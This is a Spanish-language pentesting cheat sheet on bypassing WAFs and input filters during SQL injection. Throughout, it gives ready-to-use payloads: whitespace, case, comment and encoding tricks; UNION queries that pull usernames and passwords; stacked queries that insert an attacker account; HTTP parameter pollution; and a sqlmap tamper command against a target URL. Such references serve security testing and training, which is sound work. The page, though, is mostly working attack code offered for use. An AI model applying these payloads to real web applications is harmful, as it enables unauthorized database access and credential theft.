---
icon: database
---

# Bypass de Filtros - WAF

Las aplicaciones pueden implementar filtros personalizados o WAFs (Web Application Firewalls) que bloquean patrones comunes de SQLi. Esta sección recoge las técnicas más usadas para evadir estas protecciones.

### 1. Bypass de espacios en blanco

Los espacios son uno de los primeros caracteres filtrados.

```sql
-- Alternativas al espacio
/**/          → SELECT/**/username/**/FROM/**/users
%09           → TAB horizontal
%0a           → newline
%0d           → carriage return
%0b           → vertical tab
%a0           → non-breaking space
+             → en URLs (equivale a espacio en query string)

-- Ejemplos
' UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--/**/
'/**/UNION/**/SELECT/**/1,2,3--
'%09UNION%09SELECT%091,2,3--
```

### 2. Bypass de palabras clave (case & encoding)

#### Variaciones de mayúsculas/minúsculas

```sql
-- MySQL es case-insensitive con keywords
SeLeCt, UNION, uNiOn, UniOn

SELECT * FROM users
sElEcT * fRoM uSeRs
```

#### Comentarios inline para romper keywords

```sql
-- Insertar comentarios dentro de palabras clave (MySQL)
UN/**/ION/**/SEL/**/ECT
UN/*comment*/ION SEL/*comment*/ECT

-- Con !
UN/*!ION*/ SEL/*!ECT*/ 1,2,3
```

#### Comentarios condicionales MySQL (`/*!...*/`)

```sql
-- Solo MySQL ejecuta lo que hay dentro
/*!UNION*/ /*!SELECT*/ 1,2,3
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3  -- Versión específica
```

### 3. Bypass de comillas

```sql
-- Hex encoding (MySQL) - sin comillas
WHERE username = 0x61646d696e      -- 'admin' en hex
WHERE username = 0x726f6f74        -- 'root' en hex

-- char() function
WHERE username = CHAR(97,100,109,105,110)  -- 'admin'

-- concat con char
WHERE username = concat(CHAR(97),CHAR(100),CHAR(109))

-- En extractvalue sin comillas
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=0x7461726765745f6462 LIMIT 0,1))) -- -
```

### 4. URL Encoding / Double Encoding

```sql
-- Encoding simple
' → %27
  → %20
# → %23

-- Double encoding (cuando el WAF decodifica una vez y no lo detecta)
' → %2527  (%25 = %, %27 = ')
  → %2520
```

```
-- Ejemplo en URL
/item?id=1%27%20AND%201=1--%20-
/item?id=1%2527%2520AND%25201=1--%2520-
```

### 5. Bypass con comentarios alternativos

```sql
-- Comentarios disponibles según DBMS
-- comentario de línea (estándar)
#  comentario de línea (MySQL)
/* comentario de bloque */
;%00 null byte (legacy, casi no funciona)
/*!...*/  comentario condicional MySQL

-- Uso para romper patrones detectados
' /*!AND*/ 1=1 -- -
' /*!UNION*/ /*!SELECT*/ 1,2,3 -- -
```

### 6. Bypass de filtros de palabras específicas

#### Si "UNION" está filtrado

```sql
-- Usar UNION ALL
' UNION ALL SELECT NULL,username,password FROM users -- -

-- Con comentarios embebidos
' UN/**/ION SEL/**/ECT NULL,2,3 -- -

-- Si la query es modificada/normalizada, intentar:
' uNiOn SeLeCt NULL,2,3 -- -
```

#### Si "SELECT" está filtrado

```sql
-- Comentarios embebidos
SEL/**/ECT
SE%00LECT   (null byte, legacy)

-- En MySQL con comentario condicional
/*!SELECT*/
```

#### Si "AND/OR" están filtrados

```sql
-- Alternativas a AND
&&   → ' && 1=1 -- -
%26%26

-- Alternativas a OR
||   → ' || 1=1 -- -
%7c%7c
```

#### Si "=" está filtrado

```sql
-- Alternativas a =
LIKE  → WHERE username LIKE 'admin'
IN    → WHERE username IN ('admin')
BETWEEN → WHERE id BETWEEN 1 AND 1
REGEXP  → WHERE username REGEXP 'admin'
<>    → NOT equal
!<    → not less than (MSSQL)
```

#### Si "information\_schema" está filtrado

```sql
-- MySQL — alternativas
SELECT table_name FROM mysql.innodb_table_stats;  -- tablas con stats
SELECT * FROM sys.schema_table_statistics;        -- vista sys

-- PostgreSQL — alternativas
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- MSSQL — alternativas
SELECT name FROM sysobjects WHERE type='U';       -- tablas de usuario
SELECT name FROM sys.tables;

-- Oracle — alternativas
SELECT table_name FROM all_tables;
SELECT object_name FROM all_objects WHERE object_type='TABLE';
```

### 7. HTTP-level bypasses

```sql
-- Cambiar método (GET → POST o viceversa)
-- Algunos WAF solo filtran GET

-- Cambiar Content-Type
Content-Type: application/x-www-form-urlencoded  →  Content-Type: application/json

-- Añadir headers que confundan al WAF
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

-- Fragmentar el payload en múltiples parámetros (HPP - HTTP Parameter Pollution)
?id=1' UNION&id= SELECT 1,2,3--
```

### 8. Técnicas avanzadas

#### Stacked Queries (si el driver lo permite)

```sql
-- MSSQL / PostgreSQL permiten múltiples sentencias con ;
'; SELECT SLEEP(5) -- -
'; INSERT INTO users(username,password) VALUES('hacker','pass') -- -
```

#### Subqueries alternativas

```sql
-- En lugar de UNION, usar subquery en WHERE
' AND (SELECT 1 FROM (SELECT username FROM users WHERE username='admin') t) -- -
```

#### Bypass de longitud máxima

```sql
-- Usar variables en MySQL para partir el payload
SET @q=0x53454c454354202a2046524f4d207573657273;  -- SELECT * FROM users en hex
PREPARE stmt FROM @q;
EXECUTE stmt;
```

### Cheatsheet

| Filtrado             | Bypass                                    |
| -------------------- | ----------------------------------------- |
| Espacios             | `/**/` / `%09` / `%0a`                    |
| Comillas             | `0x...` / `CHAR()`                        |
| `UNION`              | `UN/**/ION` / `UNION ALL`                 |
| `SELECT`             | `SEL/**/ECT` / `/*!SELECT*/`              |
| `AND` / `OR`         | `&&` / `\|\|`                             |
| `=`                  | `LIKE` / `IN` / `BETWEEN`                 |
| `information_schema` | `sys.tables` / `pg_tables`                |
| Keywords en general  | Comentarios inline + mayúsculas mezcladas |

> sqlmap tiene el flag `--tamper` con scripts específicos: `space2comment`, `between`, `charencode`, `randomcase`, `modsecurityversioned`, etc.

```bash
sqlmap -u "https://target.com/item?id=1" --tamper=space2comment,between,randomcase
```

> Para entender qué está filtrando el WAF, enviar payloads progresivos y observar qué genera 403 vs qué pasa. Usar Burp Repeater para iterar.
